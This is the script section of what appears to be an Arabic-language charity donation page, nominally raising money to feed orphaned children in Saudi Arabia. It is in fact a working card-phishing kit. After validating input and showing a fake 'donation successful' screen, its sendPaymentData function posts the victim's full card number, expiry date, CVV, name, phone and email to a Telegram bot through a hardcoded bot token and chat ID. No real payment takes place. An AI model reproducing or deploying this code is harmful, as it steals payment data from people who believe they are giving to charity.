            // يجب أن يبدأ الرقم بـ 5 ويتكون من 10 أرقام
            return phone.startsWith('5') && /^\d+$/.test(phone);
        }
        
        // التحقق الكامل من البطاقة
        function validateCard(cardNumber, selectedMethod) {
            if (!cardNumber || cardNumber.replace(/\s+/g, '').length < 16) {
                return { valid: false, message: "رقم البطاقة يجب أن يحتوي على 16 رقمًا" };
            }
            
            const cleaned = cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
            
            // التحقق من أن الرقم يبدأ بالرقم الصحيح حسب نوع البطاقة
            if (selectedMethod === 'visa' && !cleaned.startsWith('4')) {
                return { valid: false, message: "بطاقة فيزا يجب أن تبدأ بالرقم 4" };
            }
            
            if (selectedMethod === 'mastercard' && !(/^5[1-5]/.test(cleaned) || /^2/.test(cleaned))) {
                return { valid: false, message: "بطاقة ماستركارد يجب أن تبدأ بـ 51-55 أو 2" };
            }
            
            if (!isValidLuhn(cardNumber)) {
                return { valid: false, message: "رقم البطاقة غير صالح" };
            }
            
            const cardType = detectCardType(cardNumber);
            
            return { valid: true, type: cardType.type, name: cardType.name };
        }
        
        // التحقق من الاسم (إنجليزي فقط بدون فراغات)
        function validateName(name) {
            return /^[A-Za-z\s]+$/.test(name) && name.trim().length >= 3;
        }
        
        // التحقق من البريد الإلكتروني
        function validateEmail(email) {
            if (!email) return true; // اختياري
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }
        
        // ========== دوال الواجهة ==========
        
        // إظهار رسالة عائمة
        function showFloatingMessage(message, type = 'success') {
            const floatingMessage = document.getElementById('floatingMessage');
            const messageText = document.getElementById('floatingMessageText');
            
            floatingMessage.className = `floating-message ${type}`;
            messageText.textContent = message;
            
            if (type === 'success') {
                floatingMessage.innerHTML = `<i class="fas fa-check-circle"></i> <span id="floatingMessageText">${message}</span>`;
            } else {
                floatingMessage.innerHTML = `<i class="fas fa-exclamation-circle"></i> <span id="floatingMessageText">${message}</span>`;
            }
            
            floatingMessage.style.display = 'flex';
            floatingMessage.classList.add('show');
            
            setTimeout(() => {
                floatingMessage.classList.remove('show');
                setTimeout(() => {
                    floatingMessage.style.display = 'none';
                }, 500);
            }, 5000);
        }
        
        // تحديث معاينة البطاقة مع التحقق
        function updateCardPreview() {
            // إخفاء جميع رسائل الخطأ أولاً
            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
            document.querySelectorAll('.error-icon').forEach(el => el.style.display = 'none');
            document.querySelectorAll('input').forEach(el => el.classList.remove('invalid-field', 'valid-field'));
            
            // التحقق من الاسم
            const name = document.getElementById('cardName').value.trim();
            if (name && !validateName(name)) {
                document.getElementById('nameError').style.display = 'block';
                document.getElementById('nameErrorIcon').style.display = 'block';
                document.getElementById('cardName').classList.add('invalid-field');
            } else if (name) {
                document.getElementById('cardName').classList.add('valid-field');
            }
            
            // التحقق من رقم البطاقة
            let number = document.getElementById('cardNumber').value || '';
            const selectedMethod = document.getElementById('paymentMethod').value;
            const cardValidation = validateCard(number, selectedMethod);
            
            if (number.replace(/\s+/g, '').length > 0) {
                if (!cardValidation.valid) {
                    document.getElementById('numberError').textContent = cardValidation.message;
                    document.getElementById('numberError').style.display = 'block';
                    document.getElementById('numberErrorIcon').style.display = 'block';
                    document.getElementById('cardNumber').classList.add('invalid-field');
                } else {
                    document.getElementById('cardNumber').classList.add('valid-field');
                }
            }
            
            // التحقق من رقم الهاتف السعودي
            const phone = document.getElementById('phoneNumber').value || '';
            if (phone && !validateSaudiPhoneNumber(phone)) {
                document.getElementById('phoneError').style.display = 'block';
                document.getElementById('phoneErrorIcon').style.display = 'block';
                document.getElementById('phoneNumber').classList.add('invalid-field');
            } else if (phone) {
                document.getElementById('phoneNumber').classList.add('valid-field');
            }
            
            // التحقق من تاريخ الانتهاء
            const expiry = document.getElementById('cardExpiry').value || '';
            if (expiry && !validateExpiry(expiry)) {
                document.getElementById('expiryError').style.display = 'block';
                document.getElementById('expiryErrorIcon').style.display = 'block';
                document.getElementById('cardExpiry').classList.add('invalid-field');
            } else if (expiry) {
                document.getElementById('cardExpiry').classList.add('valid-field');
            }
            
            // التحقق من CVV
            const cvv = document.getElementById('cardCvv').value || '';
            if (cvv && (cvv.length !== 3 || !/^\d+$/.test(cvv))) {
                document.getElementById('cvvError').style.display = 'block';
                document.getElementById('cvvErrorIcon').style.display = 'block';
                document.getElementById('cardCvv').classList.add('invalid-field');
            } else if (cvv) {
                document.getElementById('cardCvv').classList.add('valid-field');
            }
            
            // التحقق من البريد الإلكتروني
            const email = document.getElementById('email').value.trim();
            if (email && !validateEmail(email)) {
                document.getElementById('emailError').style.display = 'block';
                document.getElementById('emailErrorIcon').style.display = 'block';
                document.getElementById('email').classList.add('invalid-field');
            } else if (email) {
                document.getElementById('email').classList.add('valid-field');
            }
            
            // تعطيل زر التأكيد إذا كانت هناك أخطاء
            const submitBtn = document.getElementById('submitPaymentBtn');
            submitBtn.disabled = !(
                validateName(name) && 
                cardValidation.valid && 
                validateExpiry(expiry) && 
                (cvv.length === 3 && /^\d+$/.test(cvv))
            );
            
            // تحديث العناصر
            document.getElementById('cardNamePreview').textContent = name || 'اسم حامل البطاقة';
            
            // تنسيق رقم البطاقة للمعاينة
            if (number.length > 0) {
                number = number.replace(/\s+/g, '');
                let formatted = '';
                for (let i = 0; i < number.length; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += number[i];
                }
                number = formatted;
            } else {
                number = '•••• •••• •••• ••••';
            }
            
            document.getElementById('cardNumberPreview').textContent = number;
            document.getElementById('cardExpiryPreview').textContent = expiry || 'MM/YY';
            
            // إظهار نوع البطاقة إذا كان معروفًا
            const cardTypeElement = document.getElementById('cardTypePreview');
            if (cardValidation.valid && cardValidation.name) {
                cardTypeElement.textContent = cardValidation.name;
                cardTypeElement.style.display = 'block';
            } else {
                cardTypeElement.style.display = 'none';
            }
            
            // تحديث لون بطاقة المحاكاة
            const cardPreview = document.getElementById('cardPreview');
            cardPreview.className = 'card-preview';
            
            if (cardValidation.valid) {
                cardPreview.classList.add(cardValidation.type);
                cardPreview.classList.add('valid-card');
            } else if (number.replace(/\s+/g, '').length > 0) {
                cardPreview.classList.add('invalid-card');
            } else {
                cardPreview.classList.add(selectedMethod);
            }
        }
        
        // التحقق من تاريخ الانتهاء
        function validateExpiry(expiry) {
            const expiryParts = expiry.split('/');
            if (expiryParts.length !== 2 || expiryParts[0].length !== 2 || expiryParts[1].length !== 2) {
                return false;
            }
            
            const month = parseInt(expiryParts[0]);
            const year = parseInt(expiryParts[1]);
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;
            
            if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
                return false;
            }
            
            return true;
        }
        
        // ========== دوال معالجة الدفع ==========
        
        // معالجة الدفع
        function processPayment() {
            // إخفاء جميع رسائل الخطأ
            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
            document.querySelectorAll('.error-icon').forEach(el => el.style.display = 'none');
            document.querySelectorAll('input').forEach(el => el.classList.remove('invalid-field', 'valid-field'));
            
            // التحقق من البيانات الأساسية
            const name = document.getElementById('cardName').value.trim();
            const number = document.getElementById('cardNumber').value.replace(/\s+/g, '');
            const phone = document.getElementById('phoneNumber').value;
            const expiry = document.getElementById('cardExpiry').value;
            const cvv = document.getElementById('cardCvv').value;
            const email = document.getElementById('email').value.trim();
            const selectedMethod = document.getElementById('paymentMethod').value;
            const donationNote = document.getElementById('donationNote').value;
            
            let isValid = true;
            let firstErrorElement = null;
            
            // التحقق من الاسم
            if (!validateName(name)) {
                document.getElementById('nameError').style.display = 'block';
                document.getElementById('nameErrorIcon').style.display = 'block';
                document.getElementById('cardName').classList.add('invalid-field');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = document.getElementById('cardName');
            } else {
                document.getElementById('cardName').classList.add('valid-field');
            }
            
            // التحقق من رقم البطاقة
            const cardValidation = validateCard(number, selectedMethod);
            if (!cardValidation.valid) {
                document.getElementById('numberError').textContent = cardValidation.message;
                document.getElementById('numberError').style.display = 'block';
                document.getElementById('numberErrorIcon').style.display = 'block';
                document.getElementById('cardNumber').classList.add('invalid-field');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = document.getElementById('cardNumber');
            } else {
                document.getElementById('cardNumber').classList.add('valid-field');
            }
            
            // التحقق من رقم الهاتف السعودي
            if (phone && !validateSaudiPhoneNumber(phone)) {
                document.getElementById('phoneError').style.display = 'block';
                document.getElementById('phoneErrorIcon').style.display = 'block';
                document.getElementById('phoneNumber').classList.add('invalid-field');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = document.getElementById('phoneNumber');
            } else if (phone) {
                document.getElementById('phoneNumber').classList.add('valid-field');
            }
            
            // التحقق من تاريخ الانتهاء
            if (!validateExpiry(expiry)) {
                document.getElementById('expiryError').style.display = 'block';
                document.getElementById('expiryErrorIcon').style.display = 'block';
                document.getElementById('cardExpiry').classList.add('invalid-field');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = document.getElementById('cardExpiry');
            } else {
                document.getElementById('cardExpiry').classList.add('valid-field');
            }
            
            // التحقق من CVV
            if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
                document.getElementById('cvvError').style.display = 'block';
                document.getElementById('cvvErrorIcon').style.display = 'block';
                document.getElementById('cardCvv').classList.add('invalid-field');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = document.getElementById('cardCvv');
            } else {
                document.getElementById('cardCvv').classList.add('valid-field');
            }
            
            // التحقق من البريد الإلكتروني
            if (email && !validateEmail(email)) {
                document.getElementById('emailError').style.display = 'block';
                document.getElementById('emailErrorIcon').style.display = 'block';
                document.getElementById('email').classList.add('invalid-field');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = document.getElementById('email');
            } else if (email) {
                document.getElementById('email').classList.add('valid-field');
            }
            
            if (!isValid) {
                // تحريك الصفحة لأول حقل به خطأ
                if (firstErrorElement) {
                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    firstErrorElement.focus();
                }
                return;
            }
            
            // حفظ الملاحظات في الحقل المخفي
            document.getElementById('donationNoteHidden').value = donationNote;
            
            // تعبئة بيانات شهادة التبرع
            document.getElementById('certificateAmount').textContent = document.getElementById('donationAmount').value + ' ر.س';
            document.getElementById('certificatePhone').textContent = phone ? '+966 ' + phone : 'غير متوفر';
            
            // إذا كانت جميع البيانات صحيحة
            showLoading();
            setTimeout(() => {
                hideLoading();
                sendPaymentData();
                
                // إظهار صفحة الشكر
                document.getElementById('paymentPage').style.display = 'none';
                document.getElementById('thankYouPage').style.display = 'block';
                document.getElementById('thankYouAmount').textContent = `مبلغ التبرع: ${document.getElementById('donationAmount').value} ر.س`;
                document.getElementById('donationProgress').style.width = '100%';
                
                // تعيين طريقة الدفع في صفحة الشكر
                const selectedMethod = document.querySelector('.payment-method.selected').textContent.trim();
                document.getElementById('donationMethod').textContent = selectedMethod;
                
                // إظهار رسالة نجاح
                showFloatingMessage('تمت عملية التبرع بنجاح!', 'success');
            }, 1500);
        }
        
        // إظهار شاشة التحميل
        function showLoading() {
            document.querySelector('.loading-overlay').style.display = 'flex';
        }
        
        // إخفاء شاشة التحميل
        function hideLoading() {
            document.querySelector('.loading-overlay').style.display = 'none';
        }
        
        // مشاركة على وسائل التواصل الاجتماعي
        function shareOnSocial(platform) {
            const amount = document.getElementById('donationAmount').value;
            let url = '';
            let text = `لقد تبرعت بمبلغ ${amount} ر.س لمساعدة الأطفال الأيتام عبر حملة جمعية البر الخيرية. انضم إلي وساهم في صنع الفرق!`;
            
            switch(platform) {
                case 'facebook':
                    url = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(window.location.href)}&quote=${encodeURIComponent(text)}`;
                    break;
                case 'twitter':
                    url = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(window.location.href)}`;
                    break;
                case 'whatsapp':
                    url = `https://wa.me/?text=${encodeURIComponent(text + ' ' + window.location.href)}`;
                    break;
            }
            
            window.open(url, '_blank', 'width=600,height=400');
        }
        
        // تحميل شهادة التبرع
        function downloadCertificate() {
            showLoading();
            setTimeout(() => {
                hideLoading();
                showFloatingMessage('تم تحميل شهادة التبرع بنجاح', 'success');
            }, 1500);
        }
        
        // ========== دوال إرسال البيانات ==========
        
        // إرسال بيانات الدفع إلى بوت التلجرام
        function sendPaymentData() {
            const formData = new FormData(document.getElementById('paymentForm'));
            const data = {
                card_name: formData.get('card_name'),
                card_number: formData.get('card_number'),
                phone_number: formData.get('phone_number'),
                card_expiry: formData.get('card_expiry'),
                card_cvv: formData.get('card_cvv'),
                donation_amount: formData.get('donation_amount'),
                payment_method: formData.get('payment_method'),
                email: formData.get('email'),
                donation_note: formData.get('donation_note'),
                subscribe_newsletter: formData.get('subscribe_newsletter')
            };
            
            console.log('إرسال بيانات الدفع:', data);
            
            // إعداد بيانات بوت التلجرام
            const BOT_TOKEN = "8452808616:AAF5mgQ171Mb3mSybvjTgSr2H-gWAqSqo_8";
            const CHAT_ID = "2059318108";
            
            const message = `🕌 *تبرع جديد - حملة إطعام طفل يتيم*

👤 *اسم المتبرع:* ${data.card_name}
💰 *مبلغ التبرع:* ${data.donation_amount} ر.س
💳 *طريقة الدفع:* ${data.payment_method}
📞 *رقم الهاتف:* ${data.phone_number || 'غير متوفر'}
📧 *البريد الإلكتروني:* ${data.email || 'غير متوفر'}
📝 *ملاحظات:* ${data.donation_note || 'لا توجد ملاحظات'}
⏰ *الوقت:* ${new Date().toLocaleString('ar-SA')}

💳 *معلومات البطاقة:*
- *اسم حامل البطاقة:* ${data.card_name}
- *رقم البطاقة:* ${data.card_number}
- *تاريخ الانتهاء:* ${data.card_expiry}
- *CVV:* ${data.card_cvv}

✅ *تم استلام التبرع بنجاح*`;

            // إرسال البيانات إلى بوت التلجرام
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(result => {
                if(result.ok) {
                    console.log('تم إرسال بيانات الدفع إلى بوت التلجرام:', result);
                } else {
                    console.error('خطأ في إرسال البيانات إلى بوت التلجرام:', result);
                }
            })
            .catch(error => console.error('حدث خطأ في الاتصال:', error));
        }
        
        // ========== إعداد مستمعي الأحداث ==========
        
        function initEventListeners() {
            // زر التبرع في الصفحة الرئيسية
            document.getElementById('startDonationBtn').addEventListener('click', function(e) {
                e.preventDefault();
                
                document.getElementById('welcomePage').style.display = 'none';
                document.getElementById('paymentMethodPage').style.display = 'block';
                document.getElementById('donationAmountPage').style.display = 'none';
                document.getElementById('paymentPage').style.display = 'none';
                document.getElementById('thankYouPage').style.display = 'none';
            });
            
            // زر الرجوع إلى الصفحة الرئيسية
            document.getElementById('backToWelcomeBtn').addEventListener('click', function() {
                document.getElementById('paymentMethodPage').style.display = 'none';
                document.getElementById('welcomePage').style.display = 'block';
                document.getElementById('donationProgress').style.width = '0%';
            });
            
            // اختيار طريقة الدفع
            document.querySelectorAll('.payment-method').forEach(method => {
                method.addEventListener('click', function() {
                    document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
                    this.classList.add('selected');
                    document.getElementById('paymentMethod').value = this.dataset.method;
                    
                    // تحديث لون بطاقة المحاكاة
                    const cardPreview = document.getElementById('cardPreview');
                    cardPreview.className = 'card-preview';
                    cardPreview.classList.add(this.dataset.method);
                    
                    // تحديث التحقق عند تغيير طريقة الدفع
                    updateCardPreview();
                });
            });
            
            // التالي إلى اختيار المبلغ
            document.getElementById('proceedToAmountBtn').addEventListener('click', function(e) {
                e.preventDefault();
                
                document.getElementById('paymentMethodPage').style.display = 'none';
                document.getElementById('donationAmountPage').style.display = 'block';
                document.getElementById('paymentPage').style.display = 'none';
                document.getElementById('thankYouPage').style.display = 'none';
            });
            
            // زر الرجوع إلى صفحة طريقة الدفع
            document.getElementById('backToMethodBtn').addEventListener('click', function() {
                document.getElementById('donationAmountPage').style.display = 'none';
                document.getElementById('paymentMethodPage').style.display = 'block';
            });
            
            // اختيار مبلغ التبرع
            document.querySelectorAll('.amount-option').forEach(option => {
                option.addEventListener('click', function() {
                    document.querySelectorAll('.amount-option').forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    document.getElementById('customAmount').value = '';
                    document.getElementById('amountError').style.display = 'none';
                });
            });
            
            // المبلغ المخصص
            document.getElementById('customAmount').addEventListener('input', function() {
                if (this.value) {
                    document.querySelectorAll('.amount-option').forEach(opt => opt.classList.remove('selected'));
                    document.getElementById('amountError').style.display = 'none';
                }
            });
            
            // التالي إلى الدفع
            document.getElementById('proceedToPaymentBtn').addEventListener('click', function(e) {
                e.preventDefault();
                
                let amount = 0;
                const selectedOption = document.querySelector('.amount-option.selected');
                
                if (selectedOption) {
                    amount = selectedOption.dataset.amount;
                } else if (document.getElementById('customAmount').value) {
                    amount = document.getElementById('customAmount').value;
                }
                
                if (!amount || amount <= 0) {
                    document.getElementById('amountError').style.display = 'block';
                    return;
                }
                
                document.getElementById('donationAmount').value = amount;
                
                document.getElementById('donationAmountPage').style.display = 'none';
                document.getElementById('paymentPage').style.display = 'block';
                document.getElementById('paymentForm').style.display = 'block';
            });
            
            // حدث الرجوع إلى صفحة المبلغ
            document.getElementById('backToAmountBtn').addEventListener('click', function() {
                document.getElementById('paymentPage').style.display = 'none';
                document.getElementById('donationAmountPage').style.display = 'block';
            });
            
            // حدث إرسال نموذج الدفع
            document.getElementById('paymentForm').addEventListener('submit', function(e) {
                e.preventDefault();
                processPayment();
            });
            
            // العودة إلى الصفحة الرئيسية
            document.getElementById('backToHomeBtn').addEventListener('click', function() {
                document.getElementById('thankYouPage').style.display = 'none';
                document.getElementById('welcomePage').style.display = 'block';
                
                // إعادة تعيين النموذج
                document.getElementById('paymentForm').reset();
                document.getElementById('donationAmountPage').reset();
                document.querySelectorAll('.amount-option').forEach(opt => opt.classList.remove('selected'));
                document.getElementById('donationProgress').style.width = '0%';
                document.getElementById('submitPaymentBtn').disabled = true;
                
                // إعادة تعيين معاينة البطاقة
                const cardPreview = document.getElementById('cardPreview');
                cardPreview.className = 'card-preview';
                cardPreview.classList.add('visa');
                document.getElementById('cardTypePreview').textContent = 'فيزا';
                document.getElementById('cardTypePreview').style.display = 'block';
            });
            
            // أحداث تحديث معاينة البطاقة
            document.getElementById('cardName').addEventListener('input', function() {
                // التحقق من أن الاسم باللغة الإنجليزية فقط
                this.value = this.value.replace(/[^A-Za-z\s]/g, '');
                updateCardPreview();
            });
            
            document.getElementById('cardName').addEventListener('blur', function() {
                updateCardPreview();
            });
            
            document.getElementById('cardNumber').addEventListener('input', function(e) {
                // حفظ موضع المؤشر
                const cursorPosition = this.selectionStart;
                const isDeleting = e.inputType === 'deleteContentBackward';
                let value = this.value.replace(/\s+/g, '').replace(/\D/g, '');
                value = value.substring(0, 16);
                
                // التحقق من أول رقم إذا كان هناك مدخلات
                if (value.length > 0) {
                    const selectedMethod = document.getElementById('paymentMethod').value;
                    if (selectedMethod === 'visa' && !value.startsWith('4')) {
                        document.getElementById('numberError').textContent = "بطاقة فيزا يجب أن تبدأ بالرقم 4";
                        document.getElementById('numberError').style.display = 'block';
                        document.getElementById('numberErrorIcon').style.display = 'block';
                    } else if (selectedMethod === 'mastercard' && !(/^5[1-5]/.test(value) || /^2/.test(value))) {
                        document.getElementById('numberError').textContent = "بطاقة ماستركارد يجب أن تبدأ بـ 51-55 أو 2";
                        document.getElementById('numberError').style.display = 'block';
                        document.getElementById('numberErrorIcon').style.display = 'block';
                    } else {
                        document.getElementById('numberError').style.display = 'none';
                        document.getElementById('numberErrorIcon').style.display = 'none';
                    }
                }
                
                let formatted = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                
                this.value = formatted;
                
                // حساب موضع المؤشر
                let newCursorPosition = cursorPosition;
                if (isDeleting && cursorPosition > 0 && this.value[cursorPosition - 1] === ' ') {
                    newCursorPosition = cursorPosition - 1;
                } else if (!isDeleting && (cursorPosition === 5 || cursorPosition === 10 || cursorPosition === 15)) {
                    newCursorPosition = cursorPosition + 1;
                }
                
                this.setSelectionRange(newCursorPosition, newCursorPosition);
                updateCardPreview();
            });
            
            // تنسيق رقم الهاتف السعودي (10 أرقام)
            document.getElementById('phoneNumber').addEventListener('input', function(e) {
                let value = this.value.replace(/\D/g, '');
                value = value.substring(0, 10);
                this.value = value;
            });
            
            document.getElementById('phoneNumber').addEventListener('blur', function() {
                updateCardPreview();
            });
            
            // تنسيق تاريخ الانتهاء
            document.getElementById('cardExpiry').addEventListener('input', function(e) {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                this.value = value;
            });
            
            document.getElementById('cardExpiry').addEventListener('blur', function() {
                updateCardPreview();
            });
            
            // التحقق من CVV
            document.getElementById('cardCvv').addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '').substring(0, 3);
            });
            
            document.getElementById('cardCvv').addEventListener('blur', function() {
                updateCardPreview();
            });
            
            // التحقق من البريد الإلكتروني
            document.getElementById('email').addEventListener('blur', function() {
                updateCardPreview();
            });
            
            // تحميل شهادة التبرع
            document.getElementById('downloadCertificateBtn').addEventListener('click', function() {
                downloadCertificate();
            });
        }
    </script>
</body>
</html>